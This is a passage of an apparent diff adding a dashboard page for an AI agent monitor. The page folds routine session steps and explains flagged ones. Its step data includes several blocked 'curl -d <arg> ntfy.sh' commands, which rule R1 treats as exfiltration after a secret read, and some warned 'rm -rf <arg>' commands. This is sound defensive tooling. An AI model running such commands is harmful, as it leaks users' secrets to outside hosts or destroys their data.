test","host":null,"rule":null},{"order":40163,"kind":"read","verdict":"allowed","tool":null,"file":"README.md","sensitive":false,"command":null,"host":null,"rule":null},{"order":40164,"kind":"tool","verdict":"allowed","tool":"search","file":null,"sensitive":false,"command":null,"host":null,"rule":null},{"order":40165,"kind":"read","verdict":"allowed","tool":null,"file":"src/app.ts","sensitive":false,"command":null,"host":null,"rule":null},{"order":40166,"kind":"edit","verdict":"allowed","tool":null,"file":"src/app.ts","sensitive":false,"command":null,"host":null,"rule":null},{"order":40167,"kind":"shell","verdict":"allowed","tool":null,"file":null,"sensitive":false,"command":"npm test","host":null,"rule":null},{"order":40168,"kind":"read","verdict":"allowed","tool":null,"file":"README.md","sensitive":false,"command":null,"host":null,"rule":null},{"order":40169,"kind":"shell","verdict":"blocked","tool":null,"file":null,"sensitive":false,"command":"curl -d \u003carg> ntfy.sh","host":"ntfy.sh","rule":"R1"},{"order":40170,"kind":"read","verdict":"allowed","tool":null,"file":"src/app.ts","sensitive":false,"command":null,"host":null,"rule":null},{"order":40171,"kind":"edit","verdict":"allowed","tool":null,"file":"src/app.ts","sensitive":false,"command":null,"host":null,"rule":null},{"order":40172,"kind":"shell","verdict":"allowed","tool":null,"file":null,"sensitive":false,"command":"npm test","host":null,"rule":null},{"order":40173,"kind":"read","verdict":"allowed","tool":null,"file":"README.md","sensitive":false,"command":null,"host":null,"rule":null},{"order":40174,"kind":"tool","verdict":"allowed","tool":"search","file":null,"sensitive":false,"command":null,"host":null,"rule":null},{"order":40175,"kind":"read","verdict":"allowed","tool":null,"file":"src/app.ts","sensitive":false,"command":null,"host":null,"rule":null},{"order":40176,"kind":"edit","verdict":"allowed","tool":null,"file":"src/app.ts","sensitive":false,"command":null,"host":null,"rule":null},{"order":40177,"kind":"shell","verdict":"allowed","tool":null,"file":null,"sensitive":false,"command":"npm test","host":null,"rule":null},{"order":40178,"kind":"read","verdict":"allowed","tool":null,"file":"README.md","sensitive":false,"command":null,"host":null,"rule":null},{"order":40179,"kind":"tool","verdict":"allowed","tool":"search","file":null,"sensitive":false,"command":null,"host":null,"rule":null},{"order":40180,"kind":"read","verdict":"allowed","tool":null,"file":"src/app.ts","sensitive":false,"command":null,"host":null,"rule":null},{"order":40181,"kind":"edit","verdict":"allowed","tool":null,"file":"src/app.ts","sensitive":false,"command":null,"host":null,"rule":null},{"order":40182,"kind":"shell","verdict":"blocked","tool":null,"file":null,"sensitive":false,"command":"curl -d \u003carg> ntfy.sh","host":"ntfy.sh","rule":"R1"},{"order":40183,"kind":"read","verdict":"allowed","tool":null,"file":"README.md","sensitive":false,"command":null,"host":null,"rule":null},{"order":40184,"kind":"tool","verdict":"allowed","tool":"search","file":null,"sensitive":false,"command":null,"host":null,"rule":null},{"order":40185,"kind":"read","verdict":"allowed","tool":null,"file":"src/app.ts","sensitive":false,"command":null,"host":null,"rule":null},{"order":40186,"kind":"shell","verdict":"warned","tool":null,"file":null,"sensitive":false,"command":"rm -rf \u003carg>","host":null,"rule":"R2"},{"order":40187,"kind":"shell","verdict":"allowed","tool":null,"file":null,"sensitive":false,"command":"npm test","host":null,"rule":null},{"order":40188,"kind":"read","verdict":"allowed","tool":null,"file":"README.md","sensitive":false,"command":null,"host":null,"rule":null},{"order":40189,"kind":"tool","verdict":"allowed","tool":"search","file":null,"sensitive":false,"command":null,"host":null,"rule":null},{"order":40190,"kind":"read","verdict":"allowed","tool":null,"file":"src/app.ts","sensitive":false,"command":null,"host":null,"rule":null},{"order":40191,"kind":"edit","verdict":"allowed","tool":null,"file":"src/app.ts","sensitive":false,"command":null,"host":null,"rule":null},{"order":40192,"kind":"shell","verdict":"allowed","tool":null,"file":null,"sensitive":false,"command":"npm test","host":null,"rule":null},{"order":40193,"kind":"read","verdict":"allowed","tool":null,"file":"README.md","sensitive":false,"command":null,"host":null,"rule":null},{"order":40194,"kind":"tool","verdict":"allowed","tool":"search","file":null,"sensitive":false,"command":null,"host":null,"rule":null},{"order":40195,"kind":"shell","verdict":"blocked","tool":null,"file":null,"sensitive":false,"command":"curl -d \u003carg> ntfy.sh","host":"ntfy.sh","rule":"R1"},{"order":40196,"kind":"edit","verdict":"allowed","tool":null,"file":"src/app.ts","sensitive":false,"command":null,"host":null,"rule":null},{"order":40197,"kind":"shell","verdict":"allowed","tool":null,"file":null,"sensitive":false,"command":"npm test","host":null,"rule":null},{"order":40198,"kind":"read","verdict":"allowed","tool":null,"file":"README.md","sensitive":false,"command":null,"host":null,"rule":null},{"order":40199,"kind":"tool","verdict":"allowed","tool":"search","file":null,"sensitive":false,"command":null,"host":null,"rule":null},{"order":40200,"kind":"read","verdict":"allowed","tool":null,"file":"src/app.ts","sensitive":false,"command":null,"host":null,"rule":null},{"order":40201,"kind":"edit","verdict":"allowed","tool":null,"file":"src/app.ts","sensitive":false,"command":null,"host":null,"rule":null},{"order":40202,"kind":"shell","verdict":"allowed","tool":null,"file":null,"sensitive":false,"command":"npm test","host":null,"rule":null},{"order":40203,"kind":"read","verdict":"allowed","tool":null,"file":"README.md","sensitive":false,"command":null,"host":null,"rule":null},{"order":40204,"kind":"tool","verdict":"allowed","tool":"search","file":null,"sensitive":false,"command":null,"host":null,"rule":null},{"order":40205,"kind":"read","verdict":"allowed","tool":null,"file":"src/app.ts","sensitive":false,"command":null,"host":null,"rule":null},{"order":40206,"kind":"edit","verdict":"allowed","tool":null,"file":"src/app.ts","sensitive":false,"command":null,"host":null,"rule":null},{"order":40207,"kind":"shell","verdict":"allowed","tool":null,"file":null,"sensitive":false,"command":"npm test","host":null,"rule":null},{"order":40208,"kind":"shell","verdict":"blocked","tool":null,"file":null,"sensitive":false,"command":"curl -d \u003carg> ntfy.sh","host":"ntfy.sh","rule":"R1"},{"order":40209,"kind":"tool","verdict":"allowed","tool":"search","file":null,"sensitive":false,"command":null,"host":null,"rule":null},{"order":40210,"kind":"read","verdict":"allowed","tool":null,"file":"src/app.ts","sensitive":false,"command":null,"host":null,"rule":null},{"order":40211,"kind":"edit","verdict":"allowed","tool":null,"file":"src/app.ts","sensitive":false,"command":null,"host":null,"rule":null},{"order":40212,"kind":"shell","verdict":"allowed","tool":null,"file":null,"sensitive":false,"command":"npm test","host":null,"rule":null},{"order":40213,"kind":"read","verdict":"allowed","tool":null,"file":"README.md","sensitive":false,"command":null,"host":null,"rule":null},{"order":40214,"kind":"tool","verdict":"allowed","tool":"search","file":null,"sensitive":false,"command":null,"host":null,"rule":null},{"order":40215,"kind":"read","verdict":"allowed","tool":null,"file":"src/app.ts","sensitive":false,"command":null,"host":null,"rule":null},{"order":40216,"kind":"edit","verdict":"allowed","tool":null,"file":"src/app.ts","sensitive":false,"command":null,"host":null,"rule":null},{"order":40217,"kind":"shell","verdict":"warned","tool":null,"file":null,"sensitive":false,"command":"rm -rf \u003carg>","host":null,"rule":"R2"},{"order":40218,"kind":"read","verdict":"allowed","tool":null,"file":"README.md","sensitive":false,"command":null,"host":null,"rule":null},{"order":40219,"kind":"tool","verdict":"allowed","tool":"search","file":null,"sensitive":false,"command":null,"host":null,"rule":null},{"order":40220,"kind":"read","verdict":"allowed","tool":null,"file":"src/app.ts","sensitive":false,"command":null,"host":null,"rule":null},{"order":40221,"kind":"shell","verdict":"blocked","tool":null,"file":null,"sensitive":false,"command":"curl -d \u003carg> ntfy.sh","host":"ntfy.sh","rule":"R1"},{"order":40222,"kind":"shell","verdict":"allowed","tool":null,"file":null,"sensitive":false,"command":"npm test","host":null,"rule":null},{"order":40223,"kind":"read","verdict":"allowed","tool":null,"file":"README.md","sensitive":false,"command":null,"host":null,"rule":null},{"order":40224,"kind":"tool","verdict":"allowed","tool":"search","file":null,"sensitive":false,"command":null,"host":null,"rule":null},{"order":40225,"kind":"read","verdict":"allowed","tool":null,"file":"src/app.ts","sensitive":false,"command":null,"host":null,"rule":null},{"order":40226,"kind":"edit","verdict":"allowed","tool":null,"file":"src/app.ts","sensitive":false,"command":null,"host":null,"rule":null},{"order":40227,"kind":"shell","verdict":"allowed","tool":null,"file":null,"sensitive":false,"command":"npm test","host":null,"rule":null},{"order":40228,"kind":"read","verdict":"allowed","tool":null,"file":"README.md","sensitive":false,"command":null,"host":null,"rule":null},{"order":40229,"kind":"tool","verdict":"allowed","tool":"search","file":null,"sensitive":false,"command":null,"host":null,"rule":null},{"order":40230,"kind":"read","verdict":"allowed","tool":null,"file":"src/app.ts","sensitive":false,"command":null,"host":null,"rule":null},{"order":40231,"kind":"edit","verdict":"allowed","tool":null,"file":"src/app.ts","sensitive":false,"command":null,"host":null,"rule":null},{"order":40232,"kind":"shell","verdict":"allowed","tool":null,"file":null,"sensitive":false,"command":"npm test","host":null,"rule":null},{"order":40233,"kind":"read","verdict":"allowed","tool":null,"file":"README.md","sensitive":false,"command":null,"host":null,"rule":null},{"order":40234,"kind":"shell","verdict":"blocked","tool":null,"file":null,"sensitive":false,"command":"curl -d \u003carg> ntfy.sh","host":"ntfy.sh","rule":"R1"},{"order":40235,"kind":"read","verdict":"allowed","tool":null,"file":"src/app.ts","sensitive":false,"command":null,"host":null,"rule":null},{"order":40236,"kind":"edit","verdict":"allowed","tool":null,"file":"src/app.ts","sensitive":false,"command":null,"host":null,"rule":null},{"order":40237,"kind":"shell","verdict":"allowed","tool":null,"file":null,"sensitive":false,"command":"npm test","host":null,"rule":null},{"order":40238,"kind":"read","verdict":"allowed","tool":null,"file":"README.md","sensitive":false,"command":null,"host":null,"rule":null},{"order":40239,"kind":"tool","verdict":"allowed","tool":"search","file":null,"sensitive":false,"command":null,"host":null,"rule":null}]</script>
+<script>
+(function () {
+  var BASE = 40000;
+  var steps = JSON.parse(document.getElementById('steps').textContent);
+  // Step number shown = order - 40000 + 1 (1-based position in the session). The raw `order` is kept in tooltips.
+  var n = function (s) { return s.order - BASE + 1; };
+  var secret = steps.filter(function (s) { return s.sensitive; })[0];
+  var isRoutine = function (s) { return s.verdict === 'allowed' && !s.sensitive; };
+  var R1 = 'Blocked by rule R1: a secret was read earlier in this session, and now data is being sent out.';
+  var R2 = 'Warned by rule R2: a destructive command (rm -rf) ran. The session continues.';
+  var AGENT_TAIL = ' Do not retry with another tool or language. Stop and tell the user.';
+
+  function esc(t) { return String(t).replace(/[&<>"]/g, function (c) { return ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'})[c]; }); }
+  function what(s) {
+    var v = s.file || s.command || s.tool || '';
+    return '<span class="kind">' + s.kind + '</span><span class="mono">' + esc(v) + '</span>' + (s.host ? ' <span class="note">→ ' + esc(s.host) + '</span>' : '');
+  }
+
+  // ---- group consecutive routine steps ----
+  var items = [], run = [];
+  function flush() { if (run.length) { items.push({ group: run }); run = []; } }
+  steps.forEach(function (s) { if (isRoutine(s)) run.push(s); else { flush(); items.push({ step: s }); } });
+  flush();
+
+  function groupSummary(g) {
+    var kinds = {}, order = [];
+    g.forEach(function (s) {
+      var key = s.kind + ' ' + (s.file || s.command || s.tool);
+      if (!kinds[key]) { kinds[key] = 0; order.push(key); }
+      kinds[key]++;
+    });
+    var by = { read: 0, edit: 0, shell: 0, tool: 0 };
+    g.forEach(function (s) { by[s.kind]++; });
+    var parts = Object.keys(by).filter(function (k) { return by[k]; }).map(function (k) { return by[k] + ' ' + k; });
+    var uniq = order.slice(0, 3).map(function (k) { return '<span class="mono">' + esc(k.split(' ').slice(1).join(' ')) + '</span>' + (kinds[k] > 1 ? ' ×' + kinds[k] : ''); }).join(', ');
+    return '<span class="caret"></span><b>' + g.length + ' routine step' + (g.length > 1 ? 's' : '') + '</b> · ' + parts.join(' · ') + ' — ' + uniq + (order.length > 3 ? ', …' : '');
+  }
+
+  // ---- render trail ----
+  var trail = document.getElementById('trail');
+  var html = '';
+  items.forEach(function (it) {
+    if (it.group) {
+      var g = it.group, a = n(g[0]), b = n(g[g.length - 1]);
+      html += '<details class="group"><summary><span class="no">' + (a === b ? a : a + '–' + b) + '</span><span class="what gsum">' + groupSummary(g) + '</span><span class="badge chip ok">allowed</span></summary><div class="inner">';
+      g.forEach(function (s) { html += '<div class="row"><span class="no">' + n(s) + '</span><span class="what">' + what(s) + '</span><span></span></div>'; });
+      html += '</div></details>';
+    } else {
+      var s = it.step, cls = s.verdict === 'blocked' ? 'alarm b' : s.verdict === 'warned' ? 'alarm w' : 'secret';
+      var chip = s.verdict === 'blocked' ? '<span class="badge chip blocked">Blocked · ' + s.rule + '</span>' : s.verdict === 'warned' ? '<span class="badge chip warned">Warned · ' + s.rule + '</span>' : '<span class="badge chip secret">Secret read</span>';
+      var attrs = s.verdict === 'allowed' ? '' : ' role="button" tabindex="0" data-n="' + n(s) + '" aria-selected="false"';
+      html += '<div class="row ' + cls + '" id="s' + n(s) + '"' + attrs + ' title="order ' + s.order + '"><span class="no">' + n(s) + '</span><span class="what">' + what(s) + '</span>' + chip + '</div>';
+    }
+  });
+  trail.innerHTML = html;
+
+  // ---- pinned strip ----
+  var blocked = steps.filter(function (s) { return s.verdict === 'blocked'; });
+  var warned = steps.filter(function (s) { return s.verdict === 'warned'; });
+  var pinned = document.getElementById('pinned');
+  function pins(list, cls) { return list.map(function (s) { return '<button class="pin ' + cls + '" data-n="' + n(s) + '" aria-pressed="false">#' + n(s) + '</button>'; }).join(''); }
+  pinned.innerHTML = '<h2>Pinned · stays on screen</h2>' +
+    '<div class="pin-row"><span class="lbl"><b>' + blocked.length + ' blocked</b> · R1</span>' + pins(blocked, 'b') + '</div>' +
+    '<div class="pin-row"><span class="lbl"><b>' + warned.length + ' warned</b> · R2</span>' + pins(warned, 'w') + '</div>';
+  document.getElementById('count').textContent = steps.length + ' steps';
+  document.getElementById('summary').textContent = items.filter(function (i) { return i.group; }).length + ' routine groups folded · ' + blocked.length + ' blocks and ' + warned.length + ' warnings kept in view';
+
+  // ---- Why card ----
+  var why = document.getElementById('why');
+  function midText(from, to) {
+    var r = 0, f = 0;
+    for (var i = from + 1; i < to; i++) { if (isRoutine(steps[i - 1])) r++; else f++; }
+    return r + ' routine step' + (r === 1 ? '' : 's') + (f ? ' and ' + f + ' flagged' : '') + ' between (' + (from + 1) + '–' + (to - 1) + ')';
+  }
+  function stepBy(num) { return steps[num - 1]; }
+  function showWhy(num) {
+    var s = stepBy(num);
+    document.querySelectorAll('.row.trigger, .row.chain-end').forEach(function (e) { e.classList.remove('trigger', 'chain-end'); });
+    document.querySelectorAll('[aria-selected="true"]').forEach(function (e) { e.setAttribute('aria-selected', 'false'); });
+    document.querySelectorAll('.pin').forEach(function (e) { e.setAttribute('aria-pressed', e.dataset.n === String(num) ? 'true' : 'false'); });
+    var row = document.getElementById('s' + num);
+    if (row) { row.setAttribute('aria-selected', 'true'); row.classList.add('chain-end'); }
+
+    if (s.verdict === 'blocked') {
+      var t = secret, between = num - n(t) - 1;
+      var trig = document.getElementById('s' + n(t)); if (trig) trig.classList.add('trigger');
+      var u = R1, a = R1 + AGENT_TAIL;
+      why.innerHTML =
+        '<div class="eyebrow">Why was this blocked?</div>' +
+        '<h2>Step ' + n(t) + ' read <span class="mono">' + esc(t.file) + '</span> → Step ' + num + ' tried <span class="mono">curl ' + esc(s.host) + '</span> → R1</h2>' +
+        '<div class="rule-line">Rule <b>R1</b> · severity block · decided in memory, before the command ran</div>' +
+        '<div class="chain">' +
+          '<svg aria-hidden="true"><defs><marker id="ar" viewBox="0 0 8 8" refX="7" refY="4" markerWidth="7" markerHeight="7" orient="auto"><path d="M0 0L8 4L0 8z" fill="#9aa3b2"/></marker></defs>' +
+          '<path d="M120 74 L120 86" stroke="#d97706" stroke-width="2" fill="none" marker-end="url(#ar)"/>' +
+          '<path d="M120 130 L120 142" stroke="#6b7280" stroke-width="2" fill="none" marker-end="url(#ar)"/>' +
+          '<path d="M240 168 C 270 168, 270 147, 300 147" stroke="#ef4444" stroke-width="2" stroke-dasharray="6 5" fill="none"/>' +
+          '<path d="M240 188 C 270 188, 270 190, 300 190" stroke="#ef4444" stroke-width="2" stroke-dasharray="6 5" fill="none"/>' +
+          '</svg>' +
+          '<div class="box sec"><span class="stepn">STEP ' + n(t) + '</span><span class="chip secret">Secret read</span><div class="t"><span class="kind">read</span><span class="mono">' + esc(t.file) + '</span></div><small>marks the session</small></div>' +
+          '<div class="box mid">' + (between > 0 ? midText(n(t), num) : 'next step') + '</div>' +
+          '<div class="box blk"><span class="stepn">STEP ' + num + '</span><span class="chip blocked">Blocked</span><div class="t"><span class="kind">shell</span><span class="mono">' + esc(s.command) + '</span></div><small>data sent to an outside host</small></div>' +
+          '<div class="host">' + esc(s.host) + '</div><div class="pill">R1</div>' +
+        '</div>' +
+        '<h3>Messages sent</h3>' +
+        '<div class="msg"><b>To you (user_message)</b>' + esc(u) + '</div>' +
+        '<div class="msg"><b>To the agent (agent_message)</b>' + esc(a) + '</div>' +
+        '<h3>To change this rule</h3>' +
+        '<div class="cmd">agentfly rules draft …<br>sudo agentfly rules apply &lt;draft&gt;</div>' +
+        '<div class="note">Read-only page (D19): it shows the command, it cannot change a rule.</div>';
+    } else {
+      why.innerHTML =
+        '<div class="eyebrow">Why was this flagged?</div>' +
+        '<h2>Step ' + num + ' ran <span class="mono">' + esc(s.command) + '</span> → R2 warning</h2>' +
+        '<div class="rule-line">Rule <b>R2</b> · severity warn · the command was allowed</div>' +
+        '<h3>Message</h3><div class="msg">' + esc(R2) + '</div>' +
+        '<h3>To change this rule</h3><div class="cmd">agentfly rules draft …<br>sudo agentfly rules apply &lt;draft&gt;</div>';
+    }
+  }
+  window.showWhy = showWhy;
+
+  function pick(num, scroll) {
+    showWhy(num);
+    if (scroll) { followOff(); var r = document.getElementById('s' + num); if (r) trail.scrollTop = r.offsetTop - 160; }
+  }
+  document.addEventListener('click', function (e) {
+    var t = e.target.closest('[data-n]'); if (t) pick(Number(t.dataset.n), true);
+  });
+  document.addEventListener('keydown', function (e) {
+    if ((e.key === 'Enter' || e.key === ' ') && e.target.matches('.row.alarm')) { e.preventDefault(); pick(Number(e.target.dataset.n), false); }
+  });
+
+  // ---- Follow ----
+  var fBtn = document.getElementById('follow');
+  function followOn() { fBtn.setAttribute('aria-pressed', 'true'); trail.scrollTop = trail.scrollHeight; }
+  function followOff() { fBtn.setAttribute('aria-pressed', 'false'); }
+  fBtn.addEventListener('click', function () { fBtn.getAttribute('aria-pressed') === 'true' ? followOff() : followOn(); });
+
+  // ---- initial state from URL: ?open=14&view=top|latest ----
+  var q = new URLSearchParams(location.search);
+  var first = blocked[0];
+  var open = Number(q.get('open')) || n(first);
+  showWhy(open);
+  if (q.get('view') === 'latest') { followOn(); }
+  else {
+    // Default frame: top of the session, so the Step 2 → Step 14 story is on screen with the card.
+    trail.scrollTop = 0;
+    // expand the groups between the trigger and the first block? No: keep them folded, that is the point.
+  }
+})();
+</script>
+</body>
+</html>
